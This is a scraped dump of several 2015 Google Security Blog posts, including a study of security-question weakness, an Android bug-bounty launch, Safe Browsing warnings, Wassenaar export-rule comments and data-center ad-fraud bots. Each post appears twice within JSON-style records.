Aren&#8217;t Secure         Not surprisingly, easy-to-remember answers are less secure. Easy answers often contain commonly known or publicly available information, or are in a small set of possible answers for cultural reasons (ie, a common family name in certain countries).        Here are some specific insights:        With a single guess, an attacker would have a 19.7% chance of guessing English-speaking users&#8217; answers to the question  \"What is your favorite food?\"  (it was &#8216;pizza&#8217;, by the way)&nbsp;   With ten guesses, an attacker would have a nearly 24% chance of guessing Arabic-speaking users&#8217; answer to the question  \"What&#8217;s your first teacher&#8217;s name?\"    With ten guesses, an attacker would have a 21% chance of guessing Spanish-speaking users&#8217; answers to the question,  \"What is your father&#8217;s middle name?\"    With ten guesses, an attacker would have a 39% chance of guessing Korean-speaking users&#8217; answers to the question  \"What is your city of birth?\"  and a 43% chance of guessing their favorite food.      Many different users also had identical answers to secret questions that we&#8217;d normally expect to be highly secure, such as  \"What&#8217;s your phone number?\"  or  \"What&#8217;s your frequent flyer number?\" . We dug into this further and found that 37% of people intentionally provide false answers to their questions thinking this will make them harder to guess. However, this ends up backfiring because people choose the same (false) answers, and actually increase the likelihood that an attacker can break in.     Difficult Answers Aren&#8217;t Usable     Surprise, surprise: it&#8217;s not easy to remember where your mother went to elementary school, or what your library card number is! Difficult secret questions and answers are often hard to use. Here are some specific findings:       40% of our English-speaking US users couldn&#8217;t recall their secret question answers when they needed to. These same users, meanwhile, could recall reset codes sent to them via SMS text message more than 80% of the time and via email nearly 75% of the time.   Some of the potentially safest questions&#8212; \"What is your library card number?\"  and  \"What is your frequent flyer number?\" &#8212;have only 22% and 9% recall rates, respectively.   For English-speaking users in the US the easier question,  \"What is your father&#8217;s middle name?\"  had a success rate of 76% while the potentially safer question  \"What is your first phone number?\"  had only a 55% success rate.         Why not just add more secret questions?     Of course, it&#8217;s harder to guess the right answer to two (or more) questions, as opposed to just one. However, adding questions comes at a price too: the chances that people recover their accounts drops significantly. We did a subsequent analysis to illustrate this idea (Google never actually asks multiple security questions).    According to our data, the &#8216;easiest&#8217; question and answer is  \"What city were you born in?\" &#8212;users recall this answer more than 79% of the time. The second easiest example is  \"What is your father&#8217;s middle name?\" , remembered by users 74% of the time. If an attacker had ten guesses, they&#8217;d have a 6.9% and 14.6% chance of guessing correct answers for these questions, respectively.    But, when users had to answer both together, the spread between the security and usability of secret questions becomes increasingly stark. The probability that an attacker could get both answers in ten guesses is 1%, but users will recall both answers only 59% of the time. Piling on more secret questions makes it more difficult for users to recover their accounts and is not a good solution, as a result.     The Next Question: What To Do?     Secret questions have long been a staple of authentication and account recovery online. But, given these findings its important for users and site owners to think twice about these.    We strongly encourage Google users to make sure their Google account recovery information is current. You can do this quickly and easily with our  Security Checkup . For years, we&#8217;ve only used security questions for account recovery as a last resort when SMS text or back-up email addresses don&#8217;t work and we will never use these as stand-alone proof of account ownership.    In parallel, site owners should use other methods of authentication, such as backup codes sent via SMS text or secondary email addresses, to authenticate their users and help them regain access to their accounts. These are both safer, and offer a better user experience.                                   Posted by Elie Bursztein, Anti-Abuse Research Lead and Ilan Caron, Software Engineer  What was your first pet’s name? What is your favorite food? What is your mother’s maiden name?  What do these seemingly random questions have in common? They’re all familiar examples of ‘security questions’. Chances are you’ve had to answer one these before; many online services use them to help users recover access to accounts if they forget their passwords, or as an additional layer of security to protect against suspicious logins.  But, despite the prevalence of security questions, their safety and effectiveness have rarely been studied in depth. As part of our constant efforts to improve account security, we analyzed hundreds of millions of secret questions and answers that had been used for millions of account recovery claims at Google. We then worked to measure the likelihood that hackers could guess the answers.  Our findings, summarized in a paper that we recently presented at WWW 2015, led us to conclude that secret questions are neither secure nor reliable enough to be used as a standalone account recovery mechanism. That’s because they suffer from a fundamental flaw: their answers are either somewhat secure or easy to remember—but rarely both.        Click infographic for larger version   Easy Answers Aren’t Secure  Not surprisingly, easy-to-remember answers are less secure. Easy answers often contain commonly known or publicly available information, or are in a small set of possible answers for cultural reasons (ie, a common family name in certain countries).  Here are some specific insights:   With a single guess, an attacker would have a 19.7% chance of guessing English-speaking users’ answers to the question \"What is your favorite food?\" (it was ‘pizza’, by the way)  With ten guesses, an attacker would have a nearly 24% chance of guessing Arabic-speaking users’ answer to the question \"What’s your first teacher’s name?\" With ten guesses, an attacker would have a 21% chance of guessing Spanish-speaking users’ answers to the question, \"What is your father’s middle name?\" With ten guesses, an attacker would have a 39% chance of guessing Korean-speaking users’ answers to the question \"What is your city of birth?\" and a 43% chance of guessing their favorite food.   Many different users also had identical answers to secret questions that we’d normally expect to be highly secure, such as \"What’s your phone number?\" or \"What’s your frequent flyer number?\". We dug into this further and found that 37% of people intentionally provide false answers to their questions thinking this will make them harder to guess. However, this ends up backfiring because people choose the same (false) answers, and actually increase the likelihood that an attacker can break in.  Difficult Answers Aren’t Usable  Surprise, surprise: it’s not easy to remember where your mother went to elementary school, or what your library card number is! Difficult secret questions and answers are often hard to use. Here are some specific findings:   40% of our English-speaking US users couldn’t recall their secret question answers when they needed to. These same users, meanwhile, could recall reset codes sent to them via SMS text message more than 80% of the time and via email nearly 75% of the time. Some of the potentially safest questions—\"What is your library card number?\" and \"What is your frequent flyer number?\"—have only 22% and 9% recall rates, respectively. For English-speaking users in the US the easier question, \"What is your father’s middle name?\" had a success rate of 76% while the potentially safer question \"What is your first phone number?\" had only a 55% success rate.   Why not just add more secret questions?  Of course, it’s harder to guess the right answer to two (or more) questions, as opposed to just one. However, adding questions comes at a price too: the chances that people recover their accounts drops significantly. We did a subsequent analysis to illustrate this idea (Google never actually asks multiple security questions).  According to our data, the ‘easiest’ question and answer is \"What city were you born in?\"—users recall this answer more than 79% of the time. The second easiest example is \"What is your father’s middle name?\", remembered by users 74% of the time. If an attacker had ten guesses, they’d have a 6.9% and 14.6% chance of guessing correct answers for these questions, respectively.  But, when users had to answer both together, the spread between the security and usability of secret questions becomes increasingly stark. The probability that an attacker could get both answers in ten guesses is 1%, but users will recall both answers only 59% of the time. Piling on more secret questions makes it more difficult for users to recover their accounts and is not a good solution, as a result.  The Next Question: What To Do?  Secret questions have long been a staple of authentication and account recovery online. But, given these findings its important for users and site owners to think twice about these.  We strongly encourage Google users to make sure their Google account recovery information is current. You can do this quickly and easily with our Security Checkup. For years, we’ve only used security questions for account recovery as a last resort when SMS text or back-up email addresses don’t work and we will never use these as stand-alone proof of account ownership.  In parallel, site owners should use other methods of authentication, such as backup codes sent via SMS text or secondary email addresses, to authenticate their users and help them regain access to their accounts. These are both safer, and offer a better user experience.     ", "date": "May 21, 2015"},
{"website": "Google-Security", "title": "\nAnnouncing Security Rewards for Android\n", "author": ["Posted by Jon Larimer, Android Security Engineer"], "link": "https://security.googleblog.com/2015/06/announcing-security-rewards-for-android.html", "abstract": "                             Posted by Jon Larimer, Android Security Engineer     Since 2010, our security reward programs have helped make Google products safer for everyone. Last year, we paid  more than 1.5 million dollars  to security researchers that found vulnerabilities in Chrome and other Google Products.    Today, we're expanding our program to include researchers that will find, fix, and prevent vulnerabilities on Android, specifically. Here are some details about the new  Android Security Rewards  program:       For vulnerabilities affecting Nexus phones and tablets available for sale on Google Play (currently Nexus 6 and Nexus 9), we will pay for each step required to fix a security bug, including patches and tests. This makes Nexus the first major line of mobile devices to offer an ongoing vulnerability rewards program.   In addition to rewards for vulnerabilities, our program offers even larger rewards to security researchers that invest in tests and patches that will make the entire ecosystem stronger.   The largest rewards are available to researchers that demonstrate how to work around Android&#8217;s platform security features, like ASLR, NX, and the sandboxing that is designed to prevent exploitation and protect users.           Android will continue to participate in Google&#8217;s  Patch Rewards Program  which pays for contributions that improve the security of Android (and other open source projects). We&#8217;ve also sponsored  mobile pwn2own  for the last 2 years, and we plan to continue to support this and other competitions to find vulnerabilities in Android.         As we have often said, open security research is a key strength of the Android platform. The more security research that's focused on Android, the stronger it will become.         Happy hunting.                                     Posted by Jon Larimer, Android Security Engineer  Since 2010, our security reward programs have helped make Google products safer for everyone. Last year, we paid more than 1.5 million dollars to security researchers that found vulnerabilities in Chrome and other Google Products.  Today, we're expanding our program to include researchers that will find, fix, and prevent vulnerabilities on Android, specifically. Here are some details about the new Android Security Rewards program:   For vulnerabilities affecting Nexus phones and tablets available for sale on Google Play (currently Nexus 6 and Nexus 9), we will pay for each step required to fix a security bug, including patches and tests. This makes Nexus the first major line of mobile devices to offer an ongoing vulnerability rewards program. In addition to rewards for vulnerabilities, our program offers even larger rewards to security researchers that invest in tests and patches that will make the entire ecosystem stronger. The largest rewards are available to researchers that demonstrate how to work around Android’s platform security features, like ASLR, NX, and the sandboxing that is designed to prevent exploitation and protect users.     Android will continue to participate in Google’s Patch Rewards Program which pays for contributions that improve the security of Android (and other open source projects). We’ve also sponsored mobile pwn2own for the last 2 years, and we plan to continue to support this and other competitions to find vulnerabilities in Android.    As we have often said, open security research is a key strength of the Android platform. The more security research that's focused on Android, the stronger it will become.    Happy hunting.     ", "date": "June 16, 2015"},
{"website": "Google-Security", "title": "\nMore Visible Protection Against Unwanted Software\n", "author": ["Posted by Moheeb Abu Rajab and Stephan Somogyi, Google Safe Browsing Team"], "link": "https://security.googleblog.com/2015/07/more-visible-protection-against.html", "abstract": "                             Posted by Moheeb Abu Rajab and Stephan Somogyi, Google Safe Browsing Team     Last year, we announced our  increased focus on unwanted software (UwS) , and  published our unwanted software policy . This work is the direct result of our users falling prey to UwS, and how badly it was affecting their browsing experience. Since then, Google Safe Browsing&#8217;s ability to detect deceptive software has steadily improved.    In the coming weeks, these detection improvements will become more noticeable in Chrome: users will see more  warnings &nbsp;(like the one below) about unwanted software than ever before.        We want to be really clear that Google Safe Browsing&#8217;s mandate remains unchanged: we&#8217;re exclusively focused on protecting users from malware, phishing, unwanted software, and similar harm. You won&#8217;t see Safe Browsing warnings for any other reasons.    Unwanted software is being distributed on web sites via a variety of sources,  including   ad   injectors  as well as ad networks lacking strict quality guidelines. In many cases, Safe Browsing within your browser is your last line of defense.    Google Safe Browsing has protected users from phishing and malware since 2006, and from unwanted software since 2014. We provide this protection across browsers (Chrome, Firefox, and Safari) and across platforms (Windows, Mac OS X, Linux, and Android). If you want to help us improve the defenses for everyone using a browser that integrates Safe Browsing, please consider checking the box that appears on all of our warning pages:         Safe Browsing&#8217;s focus is solely on protecting people and their data from badness. And nothing else.                                          Posted by Moheeb Abu Rajab and Stephan Somogyi, Google Safe Browsing Team  Last year, we announced our increased focus on unwanted software (UwS), and published our unwanted software policy. This work is the direct result of our users falling prey to UwS, and how badly it was affecting their browsing experience. Since then, Google Safe Browsing’s ability to detect deceptive software has steadily improved.  In the coming weeks, these detection improvements will become more noticeable in Chrome: users will see more warnings (like the one below) about unwanted software than ever before.    We want to be really clear that Google Safe Browsing’s mandate remains unchanged: we’re exclusively focused on protecting users from malware, phishing, unwanted software, and similar harm. You won’t see Safe Browsing warnings for any other reasons.  Unwanted software is being distributed on web sites via a variety of sources, including ad injectors as well as ad networks lacking strict quality guidelines. In many cases, Safe Browsing within your browser is your last line of defense.  Google Safe Browsing has protected users from phishing and malware since 2006, and from unwanted software since 2014. We provide this protection across browsers (Chrome, Firefox, and Safari) and across platforms (Windows, Mac OS X, Linux, and Android). If you want to help us improve the defenses for everyone using a browser that integrates Safe Browsing, please consider checking the box that appears on all of our warning pages:   Safe Browsing’s focus is solely on protecting people and their data from badness. And nothing else.        ", "date": "July 16, 2015"},
{"website": "Google-Security", "title": "\nGoogle, the Wassenaar Arrangement, and vulnerability research\n", "author": ["Posted by ", "Neil Martin, Export Compliance Counsel, ", "As the usage and complexity of software grows, the importance of security research has grown with it. It’s through diligent research that we uncover and fix bugs — like ", " and ", " — that can cause serious security issues for web users around the world.", "The time and effort it takes to uncover bugs is significant, and the marketplace for these vulnerabilities is competitive. That’s why we provide cash rewards for quality security research that identifies problems in our own products or proactive improvements to open-source products. We’ve ", " more than $4 million to researchers from all around the world - our current Hall of Fame includes researchers from Germany, the U.S., Japan, Brazil, and more than 30 other countries.", "With the benefits of security research in mind, there has been some public ", " and ", " around ", " put forth by the U.S. Department of Commerce that would negatively affect vulnerability research.", "The Commerce Department's proposed rules stem from U.S. membership in the ", ", a multilateral export control association. Members of the Wassenaar Arrangement have agreed to control a wide range of goods, software, and information, including technologies relating to \"intrusion software\" (as they've defined that term).", "We believe that these proposed rules, as currently written, would have a significant negative impact on the open security research community. They would also hamper our ability to defend ourselves, our users, and make the web safer. It would be a disastrous outcome if an export regulation intended to make people more secure resulted in billions of users across the globe becoming persistently less secure.", "Earlier today, we formally submitted comments on the proposed rules to the United States Commerce Department’s Bureau of Industry and Security (BIS). Our comments are lengthy, but we wanted to share some of the main concerns and questions that we have officially expressed to the U.S. government today:"], "link": "https://security.googleblog.com/2015/07/google-wassenaar-arrangement-and.html", "abstract": "                             Posted by&nbsp;    Neil Martin, Export Compliance Counsel,&nbsp; Google Legal  Tim Willis, Hacker Philanthropist, Chrome Security Team        Cross-posted on the  Google Public Policy Blog          As the usage and complexity of software grows, the importance of security research has grown with it. It&#8217;s through diligent research that we uncover and fix bugs &#8212; like  Heartbleed  and  POODLE  &#8212; that can cause serious security issues for web users around the world.        The time and effort it takes to uncover bugs is significant, and the marketplace for these vulnerabilities is competitive. That&#8217;s why we provide cash rewards for quality security research that identifies problems in our own products or proactive improvements to open-source products. We&#8217;ve  paid  more than $4 million to researchers from all around the world - our current Hall of Fame includes researchers from Germany, the U.S., Japan, Brazil, and more than 30 other countries.         Problematic new export controls           With the benefits of security research in mind, there has been some public  head scratching  and  analysis  around  proposed export control rules  put forth by the U.S. Department of Commerce that would negatively affect vulnerability research.        The Commerce Department's proposed rules stem from U.S. membership in the  Wassenaar Arrangement , a multilateral export control association. Members of the Wassenaar Arrangement have agreed to control a wide range of goods, software, and information, including technologies relating to \"intrusion software\" (as they've defined that term).        We believe that these proposed rules, as currently written, would have a significant negative impact on the open security research community. They would also hamper our ability to defend ourselves, our users, and make the web safer. It would be a disastrous outcome if an export regulation intended to make people more secure resulted in billions of users across the globe becoming persistently less secure.         Google comments on proposed rules         Earlier today, we formally submitted comments on the proposed rules to the United States Commerce Department&#8217;s Bureau of Industry and Security (BIS). Our comments are lengthy, but we wanted to share some of the main concerns and questions that we have officially expressed to the U.S. government today:         Rules are dangerously broad and vague.  The proposed rules are not feasible and would require Google to request thousands - maybe even tens of thousands - of export licenses. Since Google operates in many different countries, the controls could cover our communications about software vulnerabilities, including: emails, code review systems, bug tracking systems, instant messages - even some in-person conversations!  BIS&#8217; own FAQ  states that information about a vulnerability, including its causes, wouldn&#8217;t be controlled, but we believe that it sometimes actually could be controlled information.    You should never need a license when you report a bug to get it fixed.  There should be standing license exceptions for everyone when controlled information is reported back to manufacturers for the purposes of fixing a vulnerability. This would provide protection for security researchers that report vulnerabilities, exploits, or other controlled information to any manufacturer or their agent.    Global companies should be able to share information globally.  If we have information about intrusion software, we should be able to share that with our engineers, no matter where they physically sit.    Clarity is crucial.  We acknowledge that we have a team of lawyers here to help us out, but navigating these controls shouldn&#8217;t be that complex and confusing. If BIS is going to implement the proposed controls, we recommend providing a simple, visual flowchart for everyone to easily understand when they need a license.    These controls should be changed ASAP.  The only way to fix the scope of the intrusion software controls is to do it at the annual meeting of Wassenaar Arrangement members in December 2015.           We&#8217;re committed to working with BIS to make sure that both white hat security researchers&#8217; interests and Google users&#8217; interests are front of mind. The proposed BIS rule for public comment is available  here , and comments can also be sent directly to  publiccomments@bis.doc.gov . If BIS publishes another proposed rule on intrusion software, we&#8217;ll make sure to come back and update this blog post with details.                                     Posted by  Neil Martin, Export Compliance Counsel, Google Legal Tim Willis, Hacker Philanthropist, Chrome Security Team  Cross-posted on the Google Public Policy Blog  As the usage and complexity of software grows, the importance of security research has grown with it. It’s through diligent research that we uncover and fix bugs — like Heartbleed and POODLE — that can cause serious security issues for web users around the world.  The time and effort it takes to uncover bugs is significant, and the marketplace for these vulnerabilities is competitive. That’s why we provide cash rewards for quality security research that identifies problems in our own products or proactive improvements to open-source products. We’ve paid more than $4 million to researchers from all around the world - our current Hall of Fame includes researchers from Germany, the U.S., Japan, Brazil, and more than 30 other countries.  Problematic new export controls  With the benefits of security research in mind, there has been some public head scratching and analysis around proposed export control rules put forth by the U.S. Department of Commerce that would negatively affect vulnerability research.  The Commerce Department's proposed rules stem from U.S. membership in the Wassenaar Arrangement, a multilateral export control association. Members of the Wassenaar Arrangement have agreed to control a wide range of goods, software, and information, including technologies relating to \"intrusion software\" (as they've defined that term).  We believe that these proposed rules, as currently written, would have a significant negative impact on the open security research community. They would also hamper our ability to defend ourselves, our users, and make the web safer. It would be a disastrous outcome if an export regulation intended to make people more secure resulted in billions of users across the globe becoming persistently less secure.  Google comments on proposed rules  Earlier today, we formally submitted comments on the proposed rules to the United States Commerce Department’s Bureau of Industry and Security (BIS). Our comments are lengthy, but we wanted to share some of the main concerns and questions that we have officially expressed to the U.S. government today:   Rules are dangerously broad and vague. The proposed rules are not feasible and would require Google to request thousands - maybe even tens of thousands - of export licenses. Since Google operates in many different countries, the controls could cover our communications about software vulnerabilities, including: emails, code review systems, bug tracking systems, instant messages - even some in-person conversations! BIS’ own FAQ states that information about a vulnerability, including its causes, wouldn’t be controlled, but we believe that it sometimes actually could be controlled information. You should never need a license when you report a bug to get it fixed. There should be standing license exceptions for everyone when controlled information is reported back to manufacturers for the purposes of fixing a vulnerability. This would provide protection for security researchers that report vulnerabilities, exploits, or other controlled information to any manufacturer or their agent. Global companies should be able to share information globally. If we have information about intrusion software, we should be able to share that with our engineers, no matter where they physically sit. Clarity is crucial. We acknowledge that we have a team of lawyers here to help us out, but navigating these controls shouldn’t be that complex and confusing. If BIS is going to implement the proposed controls, we recommend providing a simple, visual flowchart for everyone to easily understand when they need a license. These controls should be changed ASAP. The only way to fix the scope of the intrusion software controls is to do it at the annual meeting of Wassenaar Arrangement members in December 2015.     We’re committed to working with BIS to make sure that both white hat security researchers’ interests and Google users’ interests are front of mind. The proposed BIS rule for public comment is available here, and comments can also be sent directly to publiccomments@bis.doc.gov. If BIS publishes another proposed rule on intrusion software, we’ll make sure to come back and update this blog post with details.     ", "date": "July 20, 2015"},
{"website": "Google-Security", "title": "\nWorking Together to Filter Automated Data-Center Traffic\n", "author": ["Posted by Vegard Johnsen, Product Manager Google Ad Traffic Quality", "Today the ", " (TAG) ", " a new pilot blacklist to protect advertisers across the industry. This blacklist comprises data-center IP addresses associated with non-human ad requests. We're happy to support this effort along with other industry leaders—Dstillery, Facebook, MediaMath, Quantcast, Rubicon Project, TubeMogul and Yahoo—and contribute our own data-center blacklist. As mentioned to ", " and in our recent ", ", we believe that if we work together we can raise the fraud-fighting bar for the whole industry.", "Data-center traffic is one of ", " of non-human or illegitimate ad traffic. The newly shared blacklist identifies web robots or “bots” that are being run in data centers but that avoid detection by the ", ". Well-behaved bots announce that they're bots as they surf the web by including a bot identifier in their declared User-Agent strings. The bots filtered by this new blacklist are different. They masquerade as human visitors by using User-Agent strings that are indistinguishable from those of typical web browsers.", "In this post, we take a closer look at a few examples of data-center traffic to show why it’s so important to filter this traffic across the industry.", "When observing the traffic generated by the IP addresses in the newly shared blacklist, we found significantly distorted click metrics. In May of 2015 on DoubleClick Campaign Manager alone, we found the blacklist filtered 8.9% of all clicks. Without filtering these clicks from campaign metrics, advertiser click-through rates would have been incorrect and for some advertisers this error would have been very large.", "Below is a plot that shows how much click-through rates in May would have been inflated across the most impacted of DoubleClick Campaign Manager’s larger advertisers.", "There are two distinct types of invalid data-center traffic: where the intent is malicious and where the impact on advertisers is accidental. In this section we consider two interesting examples where we’ve observed traffic that was likely generated with malicious intent.", "Publishers use many different strategies to increase the traffic to their sites. Unfortunately, some are willing to use any means necessary to do so. In our investigations we’ve seen instances where publishers have been running software tools in data centers to intentionally mislead advertisers with fake impressions and fake clicks.", "UrlSpirit is just one example of software that some unscrupulous publishers have been using to collaboratively drive automated traffic to their websites. Participating publishers install the UrlSpirit application on Windows machines and they each submit up to three URLs through the application’s interface. Submitted URLs are then distributed to other installed instances of the application, where Internet Explorer is used to automatically visit the list of target URLs. Publishers who have not installed the application can also leverage the network of installations by paying a fee.", "At the end of May more than 82% of the UrlSpirit installations were being run on machines in data centers. There were more than 6,500 data-center installations of UrlSpirit, with each data-center installation running in a separate virtual machine. In aggregate, the data-center installations of UrlSpirit were generating a monthly rate of at least half a billion ad requests— an average of 2,500 fraudulent ad requests per installation per day.", "HitLeap is another example of software that some publishers are using to collaboratively drive automated traffic to their websites. The software also runs on Windows machines, and each instance uses the Chromium Embedded Framework to automatically browse the websites of participating publishers—rather than using Internet Explorer.", "Before publishers can use the network of installations to drive traffic to their websites, they need browsing minutes. Participating publishers earn browsing minutes by running the application on their computers. Alternatively, they can simply buy browsing minutes—with bundles starting at $9 for 10,000 minutes or up to 1,000,000 minutes for $625.", "Publishers can specify as many target URLs as they like. The number of visits they receive from the network of installations is a function of how long they want the network of bots to spend on their sites. For example, ten browsing minutes will get a publisher five visits if the publisher requests two-minute visit durations.", "In mid-June, at least 4,800 HitLeap installations were being run in virtual machines in data centers, with a unique IP associated with each HitLeap installation. The data-center installations of HitLeap made up 16% of the total HitLeap network, which was substantially larger than the UrlSpirit network. ", "In aggregate, the data-center installations of HitLeap were generating a monthly rate of at least a billion fraudulent ad requests—or an average of 1,600 ad requests per installation per day.", "Not only were these publishers collectively responsible for billions of automated ad requests, but their websites were also often extremely deceptive. For example, of the top ten webpages visited by HitLeap bots in June, nine of these included ", " -- meaning that not only was the traffic fake, but the ads couldn’t have been seen even if they had been legitimate human visitors.", " is illustrative of these nine webpages with hidden ad slots. The webpage has no visible content other than a single 300×250px ad. This visible ad is actually in a 300×250px iframe that includes two ads, the second of which is hidden. Additionally, there are also twenty-seven 0×0px hidden iframes on this page with each hidden iframe including two ad slots. In total there are fifty-five hidden ads on this page and one visible ad. Finally, the ads served on ", " appear to advertisers as though they have been served on legitimate websites like indiatimes.com, scotsman.com, autotrader.co.uk, allrecipes.com, dictionary.com and nypost.com, because the tags used on ", " to request the ad creatives have been deliberately spoofed.", "Unlike the traffic described above, there is also automated data-center traffic that impacts advertising campaigns but that hasn’t been generated for malicious purposes. An interesting example of this is an advertising competitive intelligence company that is generating a large volume of undeclared non-human traffic.", "This company uses bots to scrape the web to find out which ad creatives are being served on which websites and at what scale. The company’s scrapers also click ad creatives to analyse the landing page destinations. To provide its clients with the most accurate possible intelligence, this company’s scrapers operate at extraordinary scale and they also do so without including bot identifiers in their User-Agent strings.", "While the aim of this company is not to cause advertisers to pay for fake traffic, the company’s scrapers do waste advertiser spend. They not only generate non-human impressions; they also distort the metrics that advertisers use to evaluate campaign performance—in particular, click metrics. Looking at the data across DoubleClick Campaign Manager this company’s scrapers were responsible for 65% of the automated data-center clicks recorded in the month of May.", "Google has always invested to prevent this and other types of invalid traffic from entering our ad platforms. By contributing our data-center blacklist to TAG, we hope to help others in the industry protect themselves.", "We’re excited by the collaborative spirit we’ve seen working with other industry leaders on this initiative. This is an important, early step toward tackling fraudulent and illegitimate inventory across the industry and we look forward to sharing more in the future. By pooling our collective efforts and working with industry bodies, we can create strong defenses against those looking to take advantage of our ecosystem. We look forward to working with the TAG Anti-fraud working group to turn this pilot program into an industry-wide tool."], "link": "https://security.googleblog.com/2015/07/working-together-to-filter-automated.html", "abstract": "                             Posted by Vegard Johnsen, Product Manager Google Ad Traffic Quality        Today the  Trustworthy Accountability Group  (TAG)  announced  a new pilot blacklist to protect advertisers across the industry. This blacklist comprises data-center IP addresses associated with non-human ad requests. We're happy to support this effort along with other industry leaders&#8212;Dstillery, Facebook, MediaMath, Quantcast, Rubicon Project, TubeMogul and Yahoo&#8212;and contribute our own data-center blacklist. As mentioned to  Ad Age  and in our recent  call to action , we believe that if we work together we can raise the fraud-fighting bar for the whole industry.        Data-center traffic is one of  many types  of non-human or illegitimate ad traffic. The newly shared blacklist identifies web robots or &#8220;bots&#8221; that are being run in data centers but that avoid detection by the  IAB/ABC International Spiders &amp; Bots List . Well-behaved bots announce that they're bots as they surf the web by including a bot identifier in their declared User-Agent strings. The bots filtered by this new blacklist are different. They masquerade as human visitors by using User-Agent strings that are indistinguishable from those of typical web browsers.        In this post, we take a closer look at a few examples of data-center traffic to show why it&#8217;s so important to filter this traffic across the industry.         Impact of the data-center blacklist         When observing the traffic generated by the IP addresses in the newly shared blacklist, we found significantly distorted click metrics. In May of 2015 on DoubleClick Campaign Manager alone, we found the blacklist filtered 8.9% of all clicks. Without filtering these clicks from campaign metrics, advertiser click-through rates would have been incorrect and for some advertisers this error would have been very large.        Below is a plot that shows how much click-through rates in May would have been inflated across the most impacted of DoubleClick Campaign Manager&#8217;s larger advertisers.            Two examples of bad data-center traffic           There are two distinct types of invalid data-center traffic: where the intent is malicious and where the impact on advertisers is accidental. In this section we consider two interesting examples where we&#8217;ve observed traffic that was likely generated with malicious intent.        Publishers use many different strategies to increase the traffic to their sites. Unfortunately, some are willing to use any means necessary to do so. In our investigations we&#8217;ve seen instances where publishers have been running software tools in data centers to intentionally mislead advertisers with fake impressions and fake clicks.         First example         UrlSpirit is just one example of software that some unscrupulous publishers have been using to collaboratively drive automated traffic to their websites. Participating publishers install the UrlSpirit application on Windows machines and they each submit up to three URLs through the application&#8217;s interface. Submitted URLs are then distributed to other installed instances of the application, where Internet Explorer is used to automatically visit the list of target URLs. Publishers who have not installed the application can also leverage the network of installations by paying a fee.        At the end of May more than 82% of the UrlSpirit installations were being run on machines in data centers. There were more than 6,500 data-center installations of UrlSpirit, with each data-center installation running in a separate virtual machine. In aggregate, the data-center installations of UrlSpirit were generating a monthly rate of at least half a billion ad requests&#8212; an average of 2,500 fraudulent ad requests per installation per day.         Second example         HitLeap is another example of software that some publishers are using to collaboratively drive automated traffic to their websites. The software also runs on Windows machines, and each instance uses the Chromium Embedded Framework to automatically browse the websites of participating publishers&#8212;rather than using Internet Explorer.        Before publishers can use the network of installations to drive traffic to their websites, they need browsing minutes. Participating publishers earn browsing minutes by running the application on their computers. Alternatively, they can simply buy browsing minutes&#8212;with bundles starting at $9 for 10,000 minutes or up to 1,000,000 minutes for $625.        Publishers can specify as many target URLs as they like. The number of visits they receive from the network of installations is a function of how long they want the network of bots to spend on their sites. For example, ten browsing minutes will get a publisher five visits if the publisher requests two-minute visit durations.        In mid-June, at least 4,800 HitLeap installations were being run in virtual machines in data centers, with a unique IP associated with each HitLeap installation. The data-center installations of HitLeap made up 16% of the total HitLeap network, which was substantially larger than the UrlSpirit network.&nbsp;        In aggregate, the data-center installations of HitLeap were generating a monthly rate of at least a billion fraudulent ad requests&#8212;or an average of 1,600 ad requests per installation per day.       Not only were these publishers collectively responsible for billions of automated ad requests, but their websites were also often extremely deceptive. For example, of the top ten webpages visited by HitLeap bots in June, nine of these included  hidden ad slots  -- meaning that not only was the traffic fake, but the ads couldn&#8217;t have been seen even if they had been legitimate human visitors.         http://vedgre.com/7/gg.html  is illustrative of these nine webpages with hidden ad slots. The webpage has no visible content other than a single 300&#215;250px ad. This visible ad is actually in a 300&#215;250px iframe that includes two ads, the second of which is hidden. Additionally, there are also twenty-seven 0&#215;0px hidden iframes on this page with each hidden iframe including two ad slots. In total there are fifty-five hidden ads on this page and one visible ad. Finally, the ads served on  http://vedgre.com/7/gg.html  appear to advertisers as though they have been served on legitimate websites like indiatimes.com, scotsman.com, autotrader.co.uk, allrecipes.com, dictionary.com and nypost.com, because the tags used on  http://vedgre.com/7/gg.html  to request the ad creatives have been deliberately spoofed.         An example of collateral damage         Unlike the traffic described above, there is also automated data-center traffic that impacts advertising campaigns but that hasn&#8217;t been generated for malicious purposes. An interesting example of this is an advertising competitive intelligence company that is generating a large volume of undeclared non-human traffic.        This company uses bots to scrape the web to find out which ad creatives are being served on which websites and at what scale. The company&#8217;s scrapers also click ad creatives to analyse the landing page destinations. To provide its clients with the most accurate possible intelligence, this company&#8217;s scrapers operate at extraordinary scale and they also do so without including bot identifiers in their User-Agent strings.        While the aim of this company is not to cause advertisers to pay for fake traffic, the company&#8217;s scrapers do waste advertiser spend. They not only generate non-human impressions; they also distort the metrics that advertisers use to evaluate campaign performance&#8212;in particular, click metrics. Looking at the data across DoubleClick Campaign Manager this company&#8217;s scrapers were responsible for 65% of the automated data-center clicks recorded in the month of May.         Going forward         Google has always invested to prevent this and other types of invalid traffic from entering our ad platforms. By contributing our data-center blacklist to TAG, we hope to help others in the industry protect themselves.        We&#8217;re excited by the collaborative spirit we&#8217;ve seen working with other industry leaders on this initiative. This is an important, early step toward tackling fraudulent and illegitimate inventory across the industry and we look forward to sharing more in the future. By pooling our collective efforts and working with industry bodies, we can create strong defenses against those looking to take advantage of our ecosystem. We look forward to working with the TAG Anti-fraud working group to turn this pilot program into an industry-wide tool.                                    Posted by Vegard Johnsen, Product Manager Google Ad Traffic Quality  Today the Trustworthy Accountability Group (TAG) announced a new pilot blacklist to protect advertisers across the industry. This blacklist comprises data-center IP addresses associated with non-human ad requests. We're happy to support this effort along with other industry leaders—Dstillery, Facebook, MediaMath, Quantcast, Rubicon Project, TubeMogul and Yahoo—and contribute our own data-center blacklist. As mentioned to Ad Age and in our recent call to action, we believe that if we work together we can raise the fraud-fighting bar for the whole industry.  Data-center traffic is one of many types of non-human or illegitimate ad traffic. The newly shared blacklist identifies web robots or “bots” that are being run in data centers but that avoid detection by the IAB/ABC International Spiders & Bots List. Well-behaved bots announce that they're bots as they surf the web by including a bot identifier in their declared User-Agent strings. The bots filtered by this new blacklist are different. They masquerade as human visitors by using User-Agent strings that are indistinguishable from those of typical web browsers.  In this post, we take a closer look at a few examples of data-center traffic to show why it’s so important to filter this traffic across the industry.  Impact of the data-center blacklist  When observing the traffic generated by the IP addresses in the newly shared blacklist, we found significantly distorted click metrics. In May of 2015 on DoubleClick Campaign Manager alone, we found the blacklist filtered 8.9% of all clicks. Without filtering these clicks from campaign metrics, advertiser click-through rates would have been incorrect and for some 